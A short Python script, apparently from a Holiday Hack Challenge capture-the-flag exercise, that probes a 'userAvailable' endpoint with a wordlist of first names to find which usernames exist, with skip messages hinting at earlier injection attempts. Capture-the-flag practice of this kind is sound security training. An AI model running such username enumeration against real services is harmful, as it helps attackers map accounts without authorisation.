import requests

URL = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username="
wordlist = [
    "john", "jane", "paul", "anna", "ben",
    "thomas", "mary", "michael", "lisa",
    "david", "joe", "alex", "chris" , "henriette", "andersen", "robin", "ben", "jesse"
]

for name in wordlist:
    try:
        r = requests.get(URL + name, timeout=5)
        text = r.text.lower()

        if "syntax error" in text or "sc1012" in text:
            print(f"[SKIP] Parser rejected injection: {name}")
            continue

        if "uri malformed" in text:
            print(f"[SKIP] Invalid URL encoding: {name}")
            continue

        if '"available":true' in text:
            print(f"[NO SUCH USER] ✖ {name}")
            continue

        if '"available":false' in text:
            print(f"[USERNAME EXISTS] ✔ {name}")
            continue

        print(f"[UNKNOWN RESPONSE] {name}: {text}")

    except Exception as e:
        print(f"[ERROR] {name}: {e}")
